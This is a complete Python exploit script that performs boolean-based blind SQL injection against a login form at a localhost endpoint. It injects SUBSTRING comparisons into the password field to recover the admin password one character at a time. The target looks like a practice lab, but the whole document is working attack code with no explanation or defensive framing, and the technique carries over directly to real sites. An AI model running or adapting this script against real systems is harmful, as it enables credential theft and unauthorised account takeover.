#!/usr/bin/env python3
import requests
import string

BASE_URL = "http://localhost:8082/blind/login"
TARGET_USER = "admin"

session = requests.Session()


def check_condition(position, char):
    payload = f"' AND SUBSTRING(password,{position},1)='{char}'--"
    data = {"username": TARGET_USER, "password": payload}
    resp = session.post(BASE_URL, data=data, allow_redirects=True)
    print(position, char, resp.status_code, len(resp.text))
    return resp.status_code == 200


def extract_password(max_len=32):
    charset = string.ascii_letters + string.digits + "_-!@#"
    guessed = ""
    for pos in range(1, max_len + 1):
        found = False
        for ch in charset:
            if check_condition(pos, ch):
                guessed += ch
                print(f"[+] Position {pos}: {ch}")
                found = True
                break
        if not found:
            # символ на этой позиции не найден — считаем, что пароль закончился
            break
    return guessed


if __name__ == "__main__":
    print("[*] Extracting admin password using boolean-based blind SQLi")
    password = extract_password()
    print(f"[+] Recovered password: {password}")
